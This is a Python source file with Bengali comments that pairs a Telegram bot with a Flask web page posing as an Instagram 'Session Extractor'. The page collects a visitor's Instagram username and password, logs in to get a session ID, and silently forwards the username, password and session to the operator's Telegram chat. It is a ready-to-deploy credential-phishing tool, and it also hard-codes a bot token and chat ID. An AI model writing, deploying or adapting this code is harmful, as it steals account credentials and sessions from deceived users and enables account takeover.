import os
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from instagrapi import Client

# --- আপনার তথ্য এখানে দিন ---
BOT_TOKEN = '8964988842:AAFYXchGL11zb6K2LfOoEAfnO-IxVtGYBKM'
ADMIN_CHAT_ID = '5428249457' 
# Render-এ ওয়েবসাইটটি যে লিংকে ওপেন হবে (যেমন: https://my-app.onrender.com)
WEB_APP_URL = 'https://আপনার_রেন্ডার_লিংক.onrender.com' 
# -----------------------------

# ১. টেলিগ্রাম বট সেটআপ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # মিনি ওয়েব অ্যাপের বাটন তৈরি
    keyboard = [
        [InlineKeyboardButton("Open Website", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("স্বাগতম! নিচের বাটনে ক্লিক করে ওয়েবসাইটে যান।", reply_markup=reply_markup)

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("Bot is running...")
    app.run_polling()

# ২. ওয়েবসাইট সেটআপ (Flask)
web_app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Extractor</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
        input { padding: 12px; margin: 10px 0; width: 90%; border-radius: 5px; border: none; }
        button { padding: 12px; width: 95%; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px;}
        .box { background: #222; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; }
        .error { color: #ff4444; margin-top: 10px; }
        .success { color: #00ff88; margin-top: 10px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Get Session ID</h2>
        <form action="/submit" method="POST">
            <input type="text" name="username" placeholder="Instagram Username" required><br>
            <input type="password" name="password" placeholder="Instagram Password" required><br>
            <button type="submit">Extract</button>
        </form>
        <div id="message"></div>
    </div>
</body>
</html>
"""

@web_app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@web_app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    try:
        # ইন্সটাগ্রামে লগইন এবং সেশন বের করা
        cl = Client()
        cl.login(username, password)
        session_id = cl.sessionid
        
        # আপনার টেলিগ্রামে পাঠানো
        send_to_telegram(username, password, session_id)
        
        return f'<div class="box"><h3 class="success">Success!</h3><p>Session ID: {session_id}</p></div>'
    except Exception as e:
        return f'<div class="box"><h3 class="error">Error</h3><p>{str(e)}</p></div>'

def send_to_telegram(user, pw, sess_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"🔔 **New Login Info**\n\n👤 Username: `{user}`\n🔑 Password: `{pw}`\n🔗 Session: `{sess_id}`"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

# ৩. বট চালু করা (Render এর জন্য জরুরি)
# Render এ ওয়েবসাইট চালু হওয়ার সময়ই বটটি ব্যাকগ্রাউন্ডে চালু হয়ে যাবে
threading.Thread(target=run_bot, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    web_app.run(host='0.0.0.0', port=port)
